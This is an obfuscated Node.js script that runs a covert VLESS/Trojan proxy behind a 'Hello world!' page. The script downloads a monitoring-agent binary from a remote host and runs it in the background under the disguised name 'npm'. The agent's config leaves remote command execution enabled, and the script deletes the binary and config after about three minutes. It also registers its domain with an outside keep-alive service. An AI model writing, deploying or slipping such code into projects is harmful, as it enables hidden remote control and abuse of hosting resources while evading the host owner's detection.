function _0x1ab6(){const _0x129426=['toString','split','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','catch','replace','writeFileSync','update','\x20-p\x20','Answer','npm\x20download\x20successfully','get','url','arm64','connection','send','142paWrsT','Not\x20Found\x0a','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','readUInt8','26617195yrbXIy','isp','13361tSKQpr','slice','base64','\x20with\x20all\x20DNS\x20servers','readUInt16BE','error','error:\x20','createWriteStream','8443','npm','config.yaml','post','log','setsid\x20nohup\x20./npm\x20-s\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','text/plain','arch','length','write','then','application/dns-json','Unknown','2087','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/v1','join','utf8','arm','text/html','&fp=chrome&type=ws&host=','https://arm64.ssss.nyc.mn/v1','596ugGuMb','includes','pipe','every','concat','substr','6HtVaZZ','Status','path','2116590yYqKUA','true','unlink','connect','reduce','close','https://dns.google/resolve?name=',':443?security=tls&sni=','find','net','18caCSZr','vless://','createServer','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','24100zqzkFu','1459312egYOEj','from','data','2096','1213161GuQDUC','&path=%2F','client_secret:\x20','https://','end','digest','8.8.4.4','listen','Hello\x20world!','https://api.ip.sb/geoip','npm\x20is\x20running','chmod\x20+x\x20npm','npm\x20running\x20error:','crypto','createHash','trim','utf-8','index.html','writeHead','Automatic\x20Access\x20Task\x20added\x20successfully','2343698eAywXL','child_process','map','443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','test'];_0x1ab6=function(){return _0x129426;};return _0x1ab6();}const _0x404d93=_0x1eca;(function(_0x2acf1b,_0x13958e){const _0x397a77=_0x1eca,_0x2e4264=_0x2acf1b();while(!![]){try{const _0xb1027=-parseInt(_0x397a77(0x1e4))/0x1*(parseInt(_0x397a77(0x1de))/0x2)+parseInt(_0x397a77(0x1b4))/0x3+parseInt(_0x397a77(0x198))/0x4*(-parseInt(_0x397a77(0x1af))/0x5)+parseInt(_0x397a77(0x19e))/0x6*(-parseInt(_0x397a77(0x1c8))/0x7)+parseInt(_0x397a77(0x1b0))/0x8+parseInt(_0x397a77(0x1ab))/0x9*(-parseInt(_0x397a77(0x1a1))/0xa)+parseInt(_0x397a77(0x1e2))/0xb;if(_0xb1027===_0x13958e)break;else _0x2e4264['push'](_0x2e4264['shift']());}catch(_0x572699){_0x2e4264['push'](_0x2e4264['shift']());}}}(_0x1ab6,0x8dfe3));const os=require('os'),http=require(_0x404d93(0x1d0)),fs=require('fs'),axios=require('axios'),net=require(_0x404d93(0x1aa)),path=require(_0x404d93(0x1a0)),crypto=require(_0x404d93(0x1c1)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x404d93(0x1c9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||'c3299726-9378-43cf-b249-21943104b2c5',NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||'1234.abc.com',AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x404d93(0x1e5)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||'sub',NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;function _0x1eca(_0x56cabd,_0x16ed26){_0x56cabd=_0x56cabd-0x180;const _0x1ab615=_0x1ab6();let _0x1eca9c=_0x1ab615[_0x56cabd];return _0x1eca9c;}let ISP='';const GetISP=async()=>{const _0x1ab9b1=_0x404d93;try{const _0x3ad5d8=await axios[_0x1ab9b1(0x1d9)](_0x1ab9b1(0x1bd)),_0xabb9a1=_0x3ad5d8[_0x1ab9b1(0x1b2)];ISP=(_0xabb9a1['country_code']+'-'+_0xabb9a1[_0x1ab9b1(0x1e3)])[_0x1ab9b1(0x1d3)](/ /g,'_');}catch(_0x388154){ISP=_0x1ab9b1(0x18e);}};GetISP();const httpServer=http[_0x404d93(0x1ad)]((_0x3e0bce,_0x485567)=>{const _0x51d10b=_0x404d93;if(_0x3e0bce['url']==='/'){const _0x27906d=path[_0x51d10b(0x192)](__dirname,_0x51d10b(0x1c5));fs['readFile'](_0x27906d,_0x51d10b(0x193),(_0x34fac1,_0x5db53a)=>{const _0x318374=_0x51d10b;if(_0x34fac1){_0x485567[_0x318374(0x1c6)](0xc8,{'Content-Type':'text/html'}),_0x485567[_0x318374(0x1b8)](_0x318374(0x1bc));return;}_0x485567['writeHead'](0xc8,{'Content-Type':_0x318374(0x195)}),_0x485567['end'](_0x5db53a);});return;}else{if(_0x3e0bce[_0x51d10b(0x1da)]==='/'+SUB_PATH){const _0x276adf=NAME?NAME+'-'+ISP:ISP,_0x11b173=_0x51d10b(0x1ac)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x51d10b(0x196)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x276adf,_0x57fba8='trojan://'+UUID+'@'+DOMAIN+_0x51d10b(0x1a8)+DOMAIN+_0x51d10b(0x196)+DOMAIN+_0x51d10b(0x1b5)+WSPATH+'#'+_0x276adf,_0x684f3a=_0x11b173+'\x0a'+_0x57fba8,_0x3ec8b6=Buffer[_0x51d10b(0x1b1)](_0x684f3a)[_0x51d10b(0x1ce)](_0x51d10b(0x1e6));_0x485567['writeHead'](0xc8,{'Content-Type':_0x51d10b(0x188)}),_0x485567[_0x51d10b(0x1b8)](_0x3ec8b6+'\x0a');}else _0x485567['writeHead'](0x194,{'Content-Type':_0x51d10b(0x188)}),_0x485567[_0x51d10b(0x1b8)](_0x51d10b(0x1df));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x404d93(0x1ba),'1.1.1.1'];function resolveHost(_0x5c78bc){return new Promise((_0x4aa3da,_0x5e37a6)=>{const _0x50ed5e=_0x1eca;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x50ed5e(0x1cd)](_0x5c78bc)){_0x4aa3da(_0x5c78bc);return;}let _0x5b47d6=0x0;function _0x1ec1ce(){const _0x4330a7=_0x50ed5e;if(_0x5b47d6>=DNS_SERVERS[_0x4330a7(0x18a)]){_0x5e37a6(new Error('Failed\x20to\x20resolve\x20'+_0x5c78bc+_0x4330a7(0x1e7)));return;}const _0x2dfab6=DNS_SERVERS[_0x5b47d6];_0x5b47d6++;const _0x1ef642=_0x4330a7(0x1a7)+encodeURIComponent(_0x5c78bc)+'&type=A';axios[_0x4330a7(0x1d9)](_0x1ef642,{'timeout':0x1388,'headers':{'Accept':_0x4330a7(0x18d)}})['then'](_0x101fd3=>{const _0x43f23e=_0x4330a7,_0x5937e0=_0x101fd3[_0x43f23e(0x1b2)];if(_0x5937e0[_0x43f23e(0x19f)]===0x0&&_0x5937e0['Answer']&&_0x5937e0[_0x43f23e(0x1d7)][_0x43f23e(0x18a)]>0x0){const _0x3b0fc7=_0x5937e0[_0x43f23e(0x1d7)][_0x43f23e(0x1a9)](_0x1d67cb=>_0x1d67cb['type']===0x1);if(_0x3b0fc7){_0x4aa3da(_0x3b0fc7['data']);return;}}_0x1ec1ce();})['catch'](_0x5a12e7=>{_0x1ec1ce();});}_0x1ec1ce();});}function handleVlessConnection(_0x186c17,_0x432c69){const _0x5bee25=_0x404d93,[_0x4aa99a]=_0x432c69,_0x376780=_0x432c69['slice'](0x1,0x11);if(!_0x376780[_0x5bee25(0x19b)]((_0x182a78,_0x2ecf91)=>_0x182a78==parseInt(uuid[_0x5bee25(0x19d)](_0x2ecf91*0x2,0x2),0x10)))return![];let _0x15d131=_0x432c69['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x23c90d=_0x432c69['slice'](_0x15d131,_0x15d131+=0x2)[_0x5bee25(0x1e8)](0x0),_0x383689=_0x432c69[_0x5bee25(0x1e5)](_0x15d131,_0x15d131+=0x1)[_0x5bee25(0x1e1)](),_0x4328fa=_0x383689==0x1?_0x432c69[_0x5bee25(0x1e5)](_0x15d131,_0x15d131+=0x4)['join']('.'):_0x383689==0x2?new TextDecoder()['decode'](_0x432c69[_0x5bee25(0x1e5)](_0x15d131+0x1,_0x15d131+=0x1+_0x432c69['slice'](_0x15d131,_0x15d131+0x1)[_0x5bee25(0x1e1)]())):_0x383689==0x3?_0x432c69[_0x5bee25(0x1e5)](_0x15d131,_0x15d131+=0x10)[_0x5bee25(0x1a5)]((_0x3f7027,_0x57c425,_0x291f28,_0x4ef641)=>_0x291f28%0x2?_0x3f7027[_0x5bee25(0x19c)](_0x4ef641['slice'](_0x291f28-0x1,_0x291f28+0x1)):_0x3f7027,[])['map'](_0x389509=>_0x389509[_0x5bee25(0x1e8)](0x0)[_0x5bee25(0x1ce)](0x10))[_0x5bee25(0x192)](':'):'';_0x186c17[_0x5bee25(0x1dd)](new Uint8Array([_0x4aa99a,0x0]));const _0x51410b=createWebSocketStream(_0x186c17);return resolveHost(_0x4328fa)['then'](_0x4f2d5d=>{const _0x3fd0e6=_0x5bee25;net[_0x3fd0e6(0x1a4)]({'host':_0x4f2d5d,'port':_0x23c90d},function(){const _0x81393b=_0x3fd0e6;this[_0x81393b(0x18b)](_0x432c69['slice'](_0x15d131)),_0x51410b['on'](_0x81393b(0x1e9),()=>{})['pipe'](this)['on'](_0x81393b(0x1e9),()=>{})[_0x81393b(0x19a)](_0x51410b);})['on'](_0x3fd0e6(0x1e9),()=>{});})[_0x5bee25(0x1d2)](_0x49b6d1=>{const _0x2ad84e=_0x5bee25;net[_0x2ad84e(0x1a4)]({'host':_0x4328fa,'port':_0x23c90d},function(){const _0x4b877f=_0x2ad84e;this['write'](_0x432c69[_0x4b877f(0x1e5)](_0x15d131)),_0x51410b['on'](_0x4b877f(0x1e9),()=>{})[_0x4b877f(0x19a)](this)['on']('error',()=>{})['pipe'](_0x51410b);})['on'](_0x2ad84e(0x1e9),()=>{});}),!![];}function handleTrojanConnection(_0x371757,_0x22acbe){const _0x10a574=_0x404d93;try{if(_0x22acbe['length']<0x3a)return![];const _0x2f58c4=_0x22acbe[_0x10a574(0x1e5)](0x0,0x38)[_0x10a574(0x1ce)](),_0x36ad4b=[UUID];let _0x104b11=null;for(const _0x42b9b8 of _0x36ad4b){const _0x360a53=crypto[_0x10a574(0x1c2)]('sha224')[_0x10a574(0x1d5)](_0x42b9b8)[_0x10a574(0x1b9)]('hex');if(_0x360a53===_0x2f58c4){_0x104b11=_0x42b9b8;break;}}if(!_0x104b11)return![];let _0xd498b9=0x38;_0x22acbe[_0xd498b9]===0xd&&_0x22acbe[_0xd498b9+0x1]===0xa&&(_0xd498b9+=0x2);const _0xeaacb7=_0x22acbe[_0xd498b9];if(_0xeaacb7!==0x1)return![];_0xd498b9+=0x1;const _0x5e8400=_0x22acbe[_0xd498b9];_0xd498b9+=0x1;let _0x557b56,_0x4d5540;if(_0x5e8400===0x1)_0x557b56=_0x22acbe[_0x10a574(0x1e5)](_0xd498b9,_0xd498b9+0x4)[_0x10a574(0x192)]('.'),_0xd498b9+=0x4;else{if(_0x5e8400===0x3){const _0x1d929b=_0x22acbe[_0xd498b9];_0xd498b9+=0x1,_0x557b56=_0x22acbe[_0x10a574(0x1e5)](_0xd498b9,_0xd498b9+_0x1d929b)[_0x10a574(0x1ce)](),_0xd498b9+=_0x1d929b;}else{if(_0x5e8400===0x4)_0x557b56=_0x22acbe[_0x10a574(0x1e5)](_0xd498b9,_0xd498b9+0x10)['reduce']((_0x901081,_0x533607,_0x2dad10,_0x35ea74)=>_0x2dad10%0x2?_0x901081[_0x10a574(0x19c)](_0x35ea74[_0x10a574(0x1e5)](_0x2dad10-0x1,_0x2dad10+0x1)):_0x901081,[])[_0x10a574(0x1ca)](_0x51ff7c=>_0x51ff7c[_0x10a574(0x1e8)](0x0)[_0x10a574(0x1ce)](0x10))[_0x10a574(0x192)](':'),_0xd498b9+=0x10;else return![];}}_0x4d5540=_0x22acbe[_0x10a574(0x1e8)](_0xd498b9),_0xd498b9+=0x2;_0xd498b9<_0x22acbe['length']&&_0x22acbe[_0xd498b9]===0xd&&_0x22acbe[_0xd498b9+0x1]===0xa&&(_0xd498b9+=0x2);const _0xe582b6=createWebSocketStream(_0x371757);return resolveHost(_0x557b56)[_0x10a574(0x18c)](_0x5c1c90=>{const _0x3b2089=_0x10a574;net[_0x3b2089(0x1a4)]({'host':_0x5c1c90,'port':_0x4d5540},function(){const _0x521a62=_0x3b2089;_0xd498b9<_0x22acbe[_0x521a62(0x18a)]&&this['write'](_0x22acbe[_0x521a62(0x1e5)](_0xd498b9)),_0xe582b6['on'](_0x521a62(0x1e9),()=>{})[_0x521a62(0x19a)](this)['on']('error',()=>{})[_0x521a62(0x19a)](_0xe582b6);})['on'](_0x3b2089(0x1e9),()=>{});})[_0x10a574(0x1d2)](_0x231e6a=>{const _0xfdfcd0=_0x10a574;net['connect']({'host':_0x557b56,'port':_0x4d5540},function(){const _0x467d3a=_0x1eca;_0xd498b9<_0x22acbe[_0x467d3a(0x18a)]&&this['write'](_0x22acbe[_0x467d3a(0x1e5)](_0xd498b9)),_0xe582b6['on']('error',()=>{})[_0x467d3a(0x19a)](this)['on'](_0x467d3a(0x1e9),()=>{})['pipe'](_0xe582b6);})['on'](_0xfdfcd0(0x1e9),()=>{});}),!![];}catch(_0x342d92){return![];}}wss['on'](_0x404d93(0x1dc),(_0x71cd3e,_0x59f9c7)=>{const _0x58ace2=_0x404d93,_0x524184=_0x59f9c7[_0x58ace2(0x1da)]||'';_0x71cd3e['once']('message',_0x152ee0=>{const _0x2682d1=_0x58ace2;if(_0x152ee0['length']>0x11&&_0x152ee0[0x0]===0x0){const _0x3334e6=_0x152ee0[_0x2682d1(0x1e5)](0x1,0x11),_0x10981a=_0x3334e6[_0x2682d1(0x19b)]((_0x1bf8e2,_0x434548)=>_0x1bf8e2==parseInt(uuid['substr'](_0x434548*0x2,0x2),0x10));if(_0x10981a){!handleVlessConnection(_0x71cd3e,_0x152ee0)&&_0x71cd3e[_0x2682d1(0x1a6)]();return;}}!handleTrojanConnection(_0x71cd3e,_0x152ee0)&&_0x71cd3e[_0x2682d1(0x1a6)]();})['on'](_0x58ace2(0x1e9),()=>{});});const getDownloadUrl=()=>{const _0x5ddf31=_0x404d93,_0x418a28=os[_0x5ddf31(0x189)]();return _0x418a28===_0x5ddf31(0x194)||_0x418a28===_0x5ddf31(0x1db)||_0x418a28==='aarch64'?!NEZHA_PORT?_0x5ddf31(0x197):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5ddf31(0x191):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x18c234=_0x404d93;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xbf55f5=getDownloadUrl(),_0x408121=await axios({'method':_0x18c234(0x1d9),'url':_0xbf55f5,'responseType':'stream'}),_0x1a002f=fs[_0x18c234(0x180)](_0x18c234(0x182));return _0x408121[_0x18c234(0x1b2)]['pipe'](_0x1a002f),new Promise((_0x52728c,_0x46b1b9)=>{_0x1a002f['on']('finish',()=>{const _0x11e00b=_0x1eca;console[_0x11e00b(0x185)](_0x11e00b(0x1d8)),exec(_0x11e00b(0x1bf),_0x2709cb=>{if(_0x2709cb)_0x46b1b9(_0x2709cb);_0x52728c();});}),_0x1a002f['on']('error',_0x46b1b9);});}catch(_0xd98ee7){throw _0xd98ee7;}},runnz=async()=>{const _0x8954b1=_0x404d93;try{const _0x42177c=execSync(_0x8954b1(0x1e0),{'encoding':_0x8954b1(0x1c4)});if(_0x42177c[_0x8954b1(0x1c3)]()!==''){console[_0x8954b1(0x185)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x5a6671){}await downloadFile();let _0x5d102b='',_0x67e832=[_0x8954b1(0x1cb),_0x8954b1(0x181),_0x8954b1(0x1b3),_0x8954b1(0x18f),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3243ba=_0x67e832[_0x8954b1(0x199)](NEZHA_PORT)?'--tls':'';_0x5d102b=_0x8954b1(0x186)+NEZHA_SERVER+':'+NEZHA_PORT+_0x8954b1(0x1d6)+NEZHA_KEY+'\x20'+_0x3243ba+_0x8954b1(0x1cc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x291a23=NEZHA_SERVER[_0x8954b1(0x199)](':')?NEZHA_SERVER[_0x8954b1(0x1cf)](':')['pop']():'',_0x1f45ea=_0x67e832[_0x8954b1(0x199)](_0x291a23)?_0x8954b1(0x1a2):'false',_0x31891b=_0x8954b1(0x1b6)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x8954b1(0x1d1)+_0x1f45ea+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x8954b1(0x1d4)](_0x8954b1(0x183),_0x31891b);}_0x5d102b=_0x8954b1(0x187);}else{console[_0x8954b1(0x185)](_0x8954b1(0x1ae));return;}}try{exec(_0x5d102b,{'shell':'/bin/bash'},_0x534916=>{const _0x1fbbe8=_0x8954b1;if(_0x534916)console[_0x1fbbe8(0x1e9)](_0x1fbbe8(0x1c0),_0x534916);else console[_0x1fbbe8(0x185)](_0x1fbbe8(0x1be));});}catch(_0x28a787){console[_0x8954b1(0x1e9)](_0x8954b1(0x1ea)+_0x28a787);}};async function addAccessTask(){const _0x5ac4ba=_0x404d93;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2ba3c6=_0x5ac4ba(0x1b7)+DOMAIN;try{const _0x43c0d1=await axios[_0x5ac4ba(0x184)](_0x5ac4ba(0x190),{'url':_0x2ba3c6},{'headers':{'Content-Type':'application/json'}});console[_0x5ac4ba(0x185)](_0x5ac4ba(0x1c7));}catch(_0x85881f){}}const delFiles=()=>{const _0x1b1eab=_0x404d93;fs[_0x1b1eab(0x1a3)]('npm',()=>{}),fs[_0x1b1eab(0x1a3)](_0x1b1eab(0x183),()=>{});};httpServer[_0x404d93(0x1bb)](PORT,()=>{const _0x28a487=_0x404d93;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x28a487(0x185)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
